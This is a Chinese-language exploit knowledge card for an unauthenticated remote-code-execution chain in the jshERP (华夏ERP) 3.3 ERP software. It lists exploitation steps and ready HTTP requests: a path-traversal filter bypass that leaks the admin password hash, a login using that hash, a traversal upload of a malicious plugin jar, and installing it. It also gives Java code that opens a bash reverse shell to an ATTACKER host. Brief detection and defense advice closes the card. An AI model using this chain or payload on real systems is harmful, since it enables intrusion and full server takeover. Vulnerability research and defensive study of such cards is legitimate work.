---
id: web-java-component-jsherp3-getuseralllist-plugin-upload-rce
title: jshERP 3.3 前台 RCE：getUserAllList 未授权泄露 admin 哈希，password 替换登录后上传恶意插件 jar 并 installByPath 安装
type: scenario
domain: web
path: web/java/component
technique: jsherp3-unauth-userlist-plugin-upload-rce
aliases:
- 华夏ERP 3.3 RCE
- jshERP getUserAllList 未授权
- filter 前缀绕过 issue 98
- SystemConfigController upload 插件
- installByPath 插件安装
- springboot-plugin-framework 恶意插件
affected_versions: 华夏ERP 3.3
tags:
- java
- jsherp
- erp
- filter-bypass
- user-enumeration
- plugin-upload
- rce
- pf4j
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V568
  verified_at: '2026-11-12T09:16:56+08:00'
  notes: 已对照原文12937及全部21张图逐张核对：图01 /user/login/../../jshERP-boot/user/getUserAllList 200 返回 userList 含 admin password 7fef6171469e80d32c0559f88b377245，与卡片PoC一致；图02 DefinePlugin 静态代码块反弹shell；图03 systemConfig/upload 的 biz=../../../../../../tmp 上传插件jar并返回/tmp/0路径（原文请求路径带 /user/login/../.. 前缀，已据此修正卡片步骤4与PoC）；图04 installByPath path参数（截图显示重复安装报 already exist，说明此前已成功加载，不影响链路）；图05 反弹shell读取flag证明RCE。affected_versions 原文标题明确写华夏ERP3.3，保留。dedup：与既有v3.6分号归一化插件RCE、v2.3 LogCostFilter contains绕过均为related非同链（本卡是3.3 getUserAllList泄露+哈希登录+SystemConfig上传+installByPath完整RCE链），无需删除。修正内容：上传请求补充 /user/login/../.. 前缀。
---

## 一句话结论

华夏 ERP（jshERP）3.3 的 `LogCostFilter` 前缀白名单可用 `/user/login/../../jshERP-boot/user/getUserAllList` 这类路径绕过，未授权拿到含 admin 密码哈希的用户列表；登录处把 `password` 直接替换为该哈希即可冒充 admin，随后用 `SystemConfigController#upload` 的 `biz` 参数目录穿越把恶意插件 jar 上传到 `/tmp`，再调 `PluginController#installByPath` 安装加载，插件静态代码块即执行命令。

## 原理

- **Filter 前缀检查与路由路径不一致**：`LogCostFilter` 用 `requestURI` 做白名单前缀判断，而 Servlet 容器在路由前会做路径归一化；请求 `/user/login/../../jshERP-boot/user/getUserAllList` 在过滤器视角像是以允许前缀开头/经过登录路径，归一化后实际路由到 `user/getUserAllList`，该接口没有鉴权，返回全部用户对象（`loginName`、`password` MD5 等）。
- **登录的密码比较缺陷**：登录接口把提交的 `password` 与数据库中的密码字段直接比较（等价于"知道哈希即可登录"），而哈希已从用户列表泄露；抓包把 `password` 替换成 admin 的 `7fef...` 值即以 admin 身份登录。
- **上传端点的目录穿越**：`SystemConfigController#upload` 取 `biz` 参数拼保存路径，`fileUploadType=1`（本地存储）时 `biz=../../../../../../tmp` 可把文件写到 `/tmp`；响应返回可访问/可引用的路径。
- **插件安装加载**：`PluginController#installByPath` 接收 `path` 参数，只校验当前用户是 `DEFAULT_MANAGER`（admin），随后 `pluginOperator.install(Paths.get(path))` 加载该路径的 jar；springboot-plugin-framework 的插件类（`DefinePlugin extends BasePlugin`）在加载/启动时执行静态初始化块与 `startEvent`，在其中写命令即可 RCE。
- **为什么成立**：三个缺陷（鉴权路径归一化差异、密码哈希泄露+直接比较、插件安装无来源校验）各自独立但可串联；插件机制本来用于热部署，天然执行 jar 内代码。

## 触发条件

- 华夏 ERP 3.3（未修复 filter 绕过与插件上传问题）；
- 前台可访问登录/用户接口，`getUserAllList` 经路径绕过可达；
- 后台 admin 可登录（哈希可替换登录）；
- JDK 可加载插件 jar，目标有 `/tmp` 可写。

## 利用步骤

1. 请求 `/user/login/../../jshERP-boot/user/getUserAllList`（原文用此路径），从响应 `userList` 中取 `loginName=admin` 的 `password` MD5。
2. 登录接口抓包，把 `password` 替换为该 MD5，以 admin 登录并记录会话/`X-Access-Token`。
3. 下载 springboot-plugin-framework 插件 demo，在 `DefinePlugin` 静态代码块写入反弹 shell/命令执行代码，打包插件 jar。
4. `POST /user/login/../../jshERP-boot/systemConfig/upload?biz=../../../../../../tmp`（原文上传请求沿用 filter 绕过前缀），表单字段 `file` 上传插件 jar，得到返回路径（如 `/tmp/0/xxx-with-dependencies.jar`）。
5. `POST /jshERP-boot/plugin/installByPath`，`path=/tmp/0/xxx-with-dependencies.jar`，插件被安装并执行，反弹 shell 或直接命令执行。
6. 通过 shell 读取 flag/敏感数据。

## PoC

```http
GET /user/login/../../jshERP-boot/user/getUserAllList HTTP/1.1
Host: target:30392
# 响应 userList 含 "loginName":"admin","password":"7fef6171469e80d32c0559f88b377245"

POST /user/login/../../jshERP-boot/systemConfig/upload?biz=../../../../../../tmp HTTP/1.1
Host: target:30392
X-Access-Token: <admin token>
Content-Type: multipart/form-data; boundary=----b

------b
Content-Disposition: form-data; name="file"; filename="basic-example-plugin1-2.1.1-RELEASE-jar-with-dependencies.jar"
Content-Type: text/plain

<插件 jar 二进制>
------b--
```

```http
POST /jshERP-boot/plugin/installByPath HTTP/1.1
Host: target:30392
X-Access-Token: <admin token>
Content-Type: application/x-www-form-urlencoded

path=/tmp/0/basic-example-plugin1-2.1.1-RELEASE-jar-with-dependencies.jar
```

插件 `DefinePlugin` 中写入：

```java
static {
    try {
        Runtime.getRuntime().exec(new String[]{"bash","-c","bash -i >& /dev/tcp/ATTACKER/4444 0>&1"});
    } catch (Exception e) {}
}
```

## 变体与关联

- 变体：`biz` 也可穿越到 Web 目录上传 WebShell（若服务器解析 jsp）；`installByPath` 也可指向任何已存在于目标上的 jar。
- 关联：同产品 v3.6 补丁绕过（分号归一化 + pf4j 上传）[[web-java-component-jsherp-filter-prefix-normalization-plugin-rce]]（不同版本/入口；本卡针对 3.3 的 getUserAllList+SystemConfig 上传链）；通用 jar 上传/插件加载风险 [[web-generic-file-upload-jar-meta-inf-resources-jsp-carrier]]。
- 变体：用户列表泄露也可直接用于撞库/爆破其他系统（密码哈希复用）。

## 检测与防御

- 检测：`getUserAllList` 等敏感接口的未授权访问与异常路径（含 `../` 的请求行）；`systemConfig/upload` 的 `biz` 参数出现 `..`；`plugin/installByPath` 指向 `/tmp` 等非插件目录；插件 jar 上传后立即安装的行为。
- 防御：升级 jshERP 修复 filter 绕过；密码比较改为对输入做哈希后比较（禁止用库中哈希当密码）；敏感接口加鉴权并统一路径规范化；上传目录禁止脚本与插件加载；`installByPath` 限制插件目录白名单并校验 jar 签名。
